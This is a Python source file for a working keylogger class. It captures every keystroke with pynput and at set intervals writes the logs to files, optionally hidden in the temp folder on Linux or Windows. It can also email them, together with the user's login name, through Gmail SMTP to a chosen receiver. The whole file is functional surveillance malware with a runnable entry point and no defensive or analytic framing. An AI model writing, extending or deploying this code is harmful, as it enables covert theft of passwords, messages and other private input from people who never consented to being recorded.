from datetime import datetime
from threading import Timer
from pynput.keyboard import Listener, Key
from platform import system
import os
import smtplib, ssl
from email.message import EmailMessage

class Keylogger:
    """
        Create the keylogger and call start() to starting the keylogger. 

        Params details:
        - interval -> time between every report;
        - reportMethod -> there are 2 types of report method:
            - file
            - email
        - onlyOneFile -> if reportMethod is file, there will be only one file
            overwritten every interval;
        - hiddenPath -> in base of the operating system, if true the keylogger will
            save the keylogs file in the temp folder (Linux and Windows tested);
        - emailSender -> if the report method is email, the keylogger uses emailSender
            as the sender of the email;
        - passwordSender -> if the report method is email, the keylogger uses passwordSender
            as the password of the emailSender;
        - emailReceiver -> if the report method is email, the keylogger uses emailSender
            as the receiver of the email. If not specified emailReceiver will be equal to
            emailSender.        
    """
    def __init__(
        self,
        interval : int = 60,
        reportMethod : str = "file",
        onlyOneFile : bool = False,
        hiddenPath : bool = False,
        emailSender : str = "",
        passwordSender : str = "",
        emailRecevier : str = ""
    ):
        self.interval = interval
        self.reportMethod = reportMethod
        self.log = ""                           # Contains the log of all the keystrokes within `self.interval`
        self.onlyOneFile = onlyOneFile
        self.startDatetime = datetime.now()
        self.endDatetime = datetime.now()
        self._updateFilename()
        self.hiddenPath = hiddenPath
        self.emailSender = emailSender
        self.passwordSender = passwordSender
        if not emailRecevier:
            self.emailRecevier = self.emailSender
        else:
            self.emailRecevier = emailRecevier 

        if hiddenPath:
            self.newPath = self._getNewPath()
    
    def start(self) -> None:
        self.startDatetime = datetime.now()
        # Start the keylogger
        # Start reporting the keylogs
        self._report()
        # Make a simple message
        print(f"{datetime.now()} - Started keylogger")
        with Listener(on_release=self._callback) as listener:
            listener.join()

    def _callback(self, key : Key) -> None:
        """
            This callback is invoked whenever a keyboard event is occured
        """
        specialKeys = {
            Key.space: " ",
            Key.enter: "[ENTER]\n",
            Key.backspace: "[BACKSPACE]"
        }

        if key in specialKeys.keys():
            self.log += specialKeys[key]
        else:
            self.log += str(key).replace("'","")

    def _getNewPath(self) -> str:
        currentOS = system()

        if currentOS == "Linux":
            return os.path.join("/","tmp")
        elif currentOS == "Windows":
            return os.path.join("C:","Users",os.getlogin(),"AppData","Local","Temp")

        return ""

    def _report(self) -> None:
        """
            This function gets called every `self.interval`
            It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.endDatetime = datetime.now()
            
            if not self.onlyOneFile:
                self._updateFilename()

            if self.reportMethod == "file":
                self._reportToFile()
            elif self.reportMethod == "email":
                if self.emailSender and self.passwordSender:
                    self._reportToEmail()
                else:
                    print("Email credentials wrong... Log losts...")
            print(f"[{self.fileName}] - {self.log}")
            self.startDatetime = datetime.now()
        
        self.log = ""
        timer = Timer(interval=self.interval, function=self._report)
        timer.daemon = True
        timer.start()

    def _reportToFile(self) -> None:
        """
            This method creates a log file in the current directory that contains
            the current keylogs in the `self.log` variable
        """
        mode = "w"
        if self.onlyOneFile:
            mode = "a"

        path = f"{self.fileName}.tmp"
        if self.hiddenPath:
            path = os.path.join(self.newPath, path)

        with open(path, mode) as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.fileName}.tmp")

    def _reportToEmail(self) -> None:
        port = 465  # For SSL
        smtp_server = "smtp.gmail.com"
        sender_email = self.emailSender  # Enter your address
        receiver_email = self.emailRecevier  # Enter receiver address
        password = self.passwordSender

        msg = EmailMessage()
        msg.set_content(self.log)
        msg['Subject'] = f"{self.fileName} {os.getlogin()} keylogger"
        msg['From'] = sender_email
        msg['To'] = receiver_email

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.send_message(msg, from_addr=sender_email, to_addrs=receiver_email)
            print(f"[+] Sended {self.fileName}")

    def _updateFilename(self) -> None:
        """
            Construct the filename to be identified by start & end datetimes
        """
        startDatetimeString = str(self.startDatetime)[:-7].replace(" ", "-").replace(":", "")
        endDatetimeString = str(self.endDatetime)[:-7].replace(" ", "-").replace(":", "")
        self.fileName = f"keylog-{startDatetimeString}_{endDatetimeString}"

if __name__ == "__main__":
    Keylogger(
        interval=5
    ).start()